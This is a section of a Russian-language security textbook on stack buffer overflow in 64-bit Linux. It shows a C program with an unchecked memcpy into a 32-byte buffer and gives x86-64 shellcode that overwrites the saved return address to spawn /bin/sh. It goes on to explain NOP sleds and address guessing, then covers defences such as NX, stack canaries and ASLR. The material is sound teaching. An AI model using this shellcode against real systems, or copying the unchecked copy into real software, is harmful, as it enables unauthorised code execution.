<!DOCTYPE html SYSTEM "about:legacy-compat">
<html><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8"><style type="text/css"> 
div.toc-item-h2 {
  padding-left: 2em;
}
div.toc-item-h3 {
  padding-left: 4em;
}
div.toc-item-h4 {
  padding-left: 6em;
}
div.toc-item-h5 {
  padding-left: 8em;
}
div.toc-item-h6 {
  padding-left: 10em;
}
</style><link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" rel="stylesheet"><style type="text/css"> 
span.small {
  font-size: 90%
}
span.tiny {
  font-size: 50%
}
</style><style type="text/css"> 
div.mathjax {
  padding-top: .5em;
  padding-bottom: .5em;
}
</style></head><body><div class="container"><h2 data-command-name="section" id="15_4_Переполнение_буфера_в_стеке">15.4. Переполнение буфера в стеке</h2><p>В качестве примера переполнения буфера опишем самую распространённую атаку, направленную на исполнение кода злоумышленника.</p><p>В 64-битовой x86-64 архитектуре основное пространство виртуальной памяти процесса из 16-ти эксбибайт (<span class="mathjax">$2^{64}$</span> байт) свободно, и только малая часть занята (выделена). Виртуальная память выделяется процессу операционной системой блоками по 4 кибибайта, называемыми страницами памяти. Выделенные страницы соответствуют страницам физической оперативной памяти или страницам файлов.</p><p>Пример выделенной виртуальной памяти процесса представлен в таблице<span class="nonbreaking-interword-space"> </span><a href="#tab:virtual-memory">[tab:virtual-memory]</a>. Локальные переменные функций хранятся в области памяти, называемой стеком.</p><p>Приведём пример переполнения буфера в стеке<a name="N111442"><!--стек--></a>, которое даёт возможность исполнить код для 64-разрядной ОС Linux. Ниже приводится листинг исходной программы, которая печатает расстояние Хэмминга между векторами <span class="mathjax">$b1 = \text{\texttt{0x01234567}}$</span> и <span class="mathjax">$b2 = \text{\texttt{0x89ABCDEF}}$</span>.</p><pre>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int hamming_distance(unsigned a1, unsigned a2, char *text,
                     size_t textsize) {
  char buf[32];
  unsigned distance = 0;
  unsigned diff = a1 ^ a2;
  while (diff) {
    if (diff &amp; 1) distance++;
    diff &gt;&gt;= 1;
  }
  memcpy(buf, text, textsize);
  printf("%s: %i\n", buf, distance);
  return distance;
}

int main() {
  char text[68] = "Hamming";
  unsigned b1 = 0x01234567;
  unsigned b2 = 0x89ABCDEF;
  return hamming_distance(b1, b2, text, 8);
}</pre><figure style="margin-left: auto; margin-right: auto; display: flex; flex-wrap: wrap; align-items: baseline; justify-content: center; width: fit-content; height: fit-content; "> <table style="border-collapse: collapse;"><colgroup><col style="border-right: solid thin;"><col style="border-left: solid thin;border-right: solid thin;"></colgroup><tr style="border-bottom: solid thin;"><td colspan="2" style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">Адрес <span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span><span class="nonbreaking-interword-space"> </span> Использование</td></tr><tr style="border-top: solid thin;"><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;"><tt>0x00000000 00000000</tt></td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;"><command name="cdashline"><argument required="true">2-2</argument></command>
        <tt>0x00000000 0040063F</tt></td><td rowspan="2" style="padding-left: 6pt;padding-right: 6pt;text-align: center;white-space: nowrap;"><command name="parbox"><argument required="true">6cm</argument><argument required="true">Исполняемый код, динамические библиотеки</argument></command></td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;"><command name="cdashline"><argument required="true">2-2</argument></command></td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;"><command name="cdashline"><argument required="true">2-2</argument></command>
        <tt>0x00000000 0143E010</tt></td><td rowspan="2" style="padding-left: 6pt;padding-right: 6pt;text-align: center;white-space: nowrap;">Динамическая память</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;"><command name="cdashline"><argument required="true">2-2</argument></command></td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;"><command name="cdashline"><argument required="true">2-2</argument></command>
        <tt>0x00007FFF A425DF26</tt></td><td rowspan="2" style="padding-left: 6pt;padding-right: 6pt;text-align: center;white-space: nowrap;">Переменные среды</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;"><command name="cdashline"><argument required="true">2-2</argument></command></td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;"><command name="cdashline"><argument required="true">2-2</argument></command>
        <tt>0x00007FFF FFFFEB60</tt></td><td rowspan="2" style="padding-left: 6pt;padding-right: 6pt;text-align: center;white-space: nowrap;">Стек функций</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;"><command name="cdashline"><argument required="true">2-2</argument></command></td></tr><tr style=""><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;">&nbsp;</td></tr><tr style="border-bottom: solid thin;"><td style="padding-left: 6pt;padding-right: 6pt;text-align: right;white-space: nowrap;"><tt>0xFFFFFFFF FFFFFFFF</tt></td></tr></table> <figcaption style="flex-basis: 100%; text-align: center;">Таблица 15.1 &mdash; Пример структуры виртуальной памяти процесса<a name="#tab:virtual-memory"></a></figcaption></figure><p>Вывод программы при запуске:</p><pre>$ ./hamming
Hamming: 8</pre><p>При вызове функций вызывающая функция выделяет стековый кадр для вызываемой функции в сторону уменьшения адресов. Стековый кадр в порядке уменьшения адресов состоит из следующих частей:</p><ol><li>Аргументы вызова функции, расположенные в порядке увеличения адреса (за исключением тех, которые передаются в регистрах процессора).</li><li>Сохранённый регистр процессора <tt>rip</tt> вызывающей функции, также называемый адресом возврата. Регистр <tt>rip</tt> содержит адрес следующей инструкции для исполнения. При входе в вызываемую функцию <tt>rip</tt> запоминается в стеке, затем в <tt>rip</tt> записывается адрес первой инструкции вызываемой функции, а по завершении функции <tt>rip</tt> восстанавливается из стека, и, таким образом, исполнение возвращается назад.</li><li>Сохранённый регистр процессора <tt>rbp</tt> вызывающей функции. Регистр <tt>rbp</tt> содержит адрес сохранённого предыдущего значения <tt>rbp</tt> вызывающей функции. Процессор обращается к локальным переменным функций по смещению относительно <tt>rbp</tt>. При вызове функции <tt>rbp</tt> сохраняется в стеке, затем в <tt>rbp</tt> записывается текущее значение адреса вершины стека (регистр <tt>rsp</tt>), а по завершении функции <tt>rbp</tt> восстанавливается.</li><li>Локальные переменные вызываемой функции, как правило, расположенные в порядке уменьшения адреса при объявлении новой переменной (порядок может быть изменён в результате оптимизаций и использования механизмов защиты, таких как Stack Smashing Protection в компиляторе GCC).</li></ol><p>Адрес начала стека, а также, возможно, адреса локальных массивов и переменных выровнены по границе параграфа в 16 байтов, из-за чего в стеке могут образоваться неиспользуемые байты.</p><p>Если в программе имеется ошибка, которая может привести к переполнению выделенного буфера в стеке при копировании, то есть возможность записать вместо сохранённого значения регистра <tt>rip</tt> новое. В результате по завершении данной функции исполнение начнётся с указанного адреса. Если есть возможность записать в переполняемый буфер исполняемый код, а затем на место сохранённого регистра <tt>rip</tt> адрес на этот код, то получим исполнение заданного кода в стеке функции.</p><p>На рис.<span class="nonbreaking-interword-space"> </span><a href="15_4_Perepolnenie_bufera_v_steke.html#fig:stack-overflow">15.1</a> приведены исходный стек и стек с переполнением буфера, из-за которого записалось новое сохранённое значение <tt>rip</tt>.</p><figure style="margin-left: auto; margin-right: auto; display: flex; flex-wrap: wrap; align-items: baseline; justify-content: center; width: fit-content; height: fit-content; width: 95%;"><a name="fig:stack-overflow" style="vertical-align: top; align-self: start;"></a><img src="images/8C92A1F2D78B8668A68EC1B43ABC4EDD.png" style="width: 100%"><figcaption style="flex-basis: 100%; text-align: center;">Рис. 15.1 &mdash; Исходный стек и стек с переполнением буфера</figcaption></figure><p>Изменим программу для демонстрации, поместив в копируемую строку исполняемый код для вызова <tt>/bin/sh</tt>.</p><span class="small"></span><pre>...
int main() {
  char text[68] =
    // 28 байтов исполняемого кода
    "\x90" "\x90" "\x90"                // nop; nop; nop
    "\x48\x31" "\xD2"                   // xor %rdx, %rdx
    "\x48\x31" "\xF6"                   // xor %rsi, %rsi
    "\x48\xBF" "\xDC\xEA\xFF\xFF"
    "\xFF\x7F\x00\x00"                  // mov $0x7fffffffeadc,
                                        //   %rdi
    "\x48\xC7\xC0" "\x3B\x00\x00\x00"   // mov $0x3b, %rax
    "\x0F\x05"                          // syscall
    // 8 байтов строки /bin/sh
    "\x2F\x62\x69\x6E\x2F\x73\x68\x00"  // "/bin/sh\0"
    // 12 байтов заполнения и 16 байтов новых
    // значений сохранённых регистров
    "\x00\x00\x00\x00"                  // незанятые байты
    "\x00\x00\x00\x00"                  // unsigned distance
    "\x00\x00\x00\x00"                  // unsigned diff
    "\x50\xEB\xFF\xFF"                  // регистр
    "\xFF\x7F\x00\x00"                  //   rbp=0x7fffffffeb50
    "\xC0\xEA\xFF\xFF"                  // регистр
    "\xFF\x7F\x00\x00";                 //   rip=0x7fffffffeac0
  ...
  hamming_distance(b1, b2, text, 68);
  return 0;
}</pre><p>Код эквивалентен вызову функции <tt>execve(``/bin/sh'', 0, 0)</tt> через системный вызов функции ядра Linux для запуска оболочки среды <tt>/bin/sh</tt>. При системном вызове нужно записать в регистр <tt>rax</tt> номер системной функции, а в другие регистры процессора &ndash; аргументы. Данный системный вызов с номером <tt>0x3b</tt> требует в качестве аргументов регистры <tt>rdi</tt> с адресом строки исполняемой программы, <tt>rsi</tt> и <tt>rdx</tt> с адресами строк параметров запускаемой программы и переменных среды. В примере в <tt>rdi</tt> записывается адрес <tt>0x7fffffffeadc</tt>, который указывает на строку <tt>``/bin/sh''</tt> в стеке после копирования. Регистры <tt>rdx</tt> и <tt>rsi</tt> обнуляются.</p><p>На рис.<span class="nonbreaking-interword-space"> </span><a href="15_4_Perepolnenie_bufera_v_steke.html#fig:stack-overflow">15.1</a> приведён стек с переполненным буфером, в котором записалось новое сохранённое значение <tt>rip</tt>, указывающее на заданный код в стеке.</p><p>Начальные инструкции <tt>nop</tt> с кодом <tt>0x90</tt> означают пустые операции. Часто точные значения адреса и структуры стека неизвестны, поэтому злоумышленник угадывает предполагаемый адрес стека. В начале исполняемого кода создаётся массив из операций <tt>nop</tt> с надеждой на то, что предполагаемое значение стека, то есть требуемый адрес <tt>rip</tt>, попадёт на эти операции, повысив шансы угадывания. Стандартная атака на переполнение буфера с исполнением кода также подразумевает последовательный перебор предполагаемых адресов для нахождения правильного адреса для <tt>rip</tt>.</p><p>В результате переполнения буфера в примере по завершении функции <tt>hamming<_></_>distance()</tt> начнёт исполняться инструкция с адреса строки <tt>buf</tt>, то есть заданный код.</p><h3 data-command-name="subsection" id="15_4_1_Защита">15.4.1. Защита</h3><p>Лучший способ защиты от атак переполнения буфера &ndash; создание программного кода со слежением за размером данных и длиной буфера. Однако ошибки всё равно происходят. Существует несколько стандартных способов защиты от исполнения кода в стеке в архитектуре x86 (x86-64).</p><ol><li>Современные 64-разрядные x86-64 процессоры включают поддержку флагов доступа к страницам памяти. В таблице виртуальной памяти, выделенной процессу, каждая страница имеет набор флагов, отвечающих за защиту страниц от некорректных действий программы:
		<ul><li>флаг разрешения доступа из пользовательского режима &ndash; если флаг не установлен, то доступ к данной области памяти возможен только из режима ядра;</li><li>флаг запрета записи &ndash; если флаг установлен, то попытка выполнить запись в данную область памяти приведёт к возникновению исключения;</li><li>флаг запрета исполнения<a name="N111988"><!--бит запрета исполнения--></a> (NX-Bit, No eXecute Bit в терминологии AMD; XD-Bit, Execute Disable Bit в терминологии Intel; DEP, Data Execution Prevention &ndash; соответствующая опция защиты в операционных системах) &ndash; если флаг установлен, то при попытке передачи управления на данную область памяти возникнет исключение. Для совместимости со старым программным обеспечением есть возможность отключить использование данного флага на уровне операционной системы целиком или для отдельных программ.</li></ul>
	Попытка выполнить операции, которые запрещены соответствующими настройками (флагами) виртуальной памяти, вызывает ошибку сегментации (жарг. <i>сегфолт</i>, англ. <span lang="en"><i>segmentation fault, segfault</i></span>). Обычно данная ошибка приводит к аварийному завершению работы атакуемой программы (сервиса).</li><li>Второй стандартный способ &ndash; вставка проверочных символов (англ. <span lang="en"><i>canaries, guards</i></span>) после массивов и в конце стека и их проверка перед выходом из функции. Если произошло переполнение буфера, программа аварийно завершится. Данный способ защиты реализован с помощью модификации конечного кода программы во время компиляции<command name="footnote"><argument required="true">См. опции <tt>-fstack-protector</tt> для GCC, <tt>/GS</tt> для компиляторов от Microsoft и другие.</argument></command>, его нельзя включить или отключить без перекомпиляции программного обеспечения.</li><li>Третий способ &ndash; рандомизация адресного пространства (англ. <span lang="en"><i>address space layout randomization, ASLR</i></span>), то есть случайное расположение стека, кода и<span class="nonbreaking-interword-space"> </span>т.&nbsp;д. В настоящее время используется в большинстве современных операционных систем (Android, iOS, Linux, OpenBSD, macOS, Windows). Это приводит к маловероятному угадыванию адресов и значительно усложняет использование уязвимости.</li></ol><h3 data-command-name="subsection" id="15_4_2_Другие_атаки_с_переполнением_буфера">15.4.2. Другие атаки с переполнением буфера</h3><p>Почти любую возможность для переполнения буфера в стеке или динамической памяти можно использовать для получения критической ошибки в программе из-за обращения к адресам виртуальной памяти, страницы которых не были выделены процессу. Следовательно, можно проводить атаки отказа в обслуживании (англ. <span lang="en"><i>Denial of Service (DoS) attacks</i></span>).</p><p>Переполнение буфера в динамической памяти, в случае хранения в ней адресов для вызова функций, может привести к подмене адресов и исполнению другого кода.</p><p>В описанных DoS-атаках NX-бит не защищает систему.</p><nav aria-label="Page navigation example"><ul class="pagination justify-content-center"><li class="page-item"><a class="page-link" href="15_3_Vidi_programmnih_ujazvimostey.html">&#129080; 15_3_Vidi_programmnih_ujazvimostey</a></li><li class="page-item"><a class="page-link" href="15_5_Mezhsaytoviy_skripting.html">15_5_Mezhsaytoviy_skripting &#129082;</a></li></ul></nav></div><script>
window.MathJax = {
  loader: {
    load: ['[tex]/tagformat'],
  },
  options: {
    processHtmlClass: 'mathjax'
  },
  tex: {
    packages: {
      '[+]': ['base', 'ams', 'physics', 'textcomp']
    },
    inlineMath: [['$', '$']],
  },
};
</script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="yes" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script></body></html>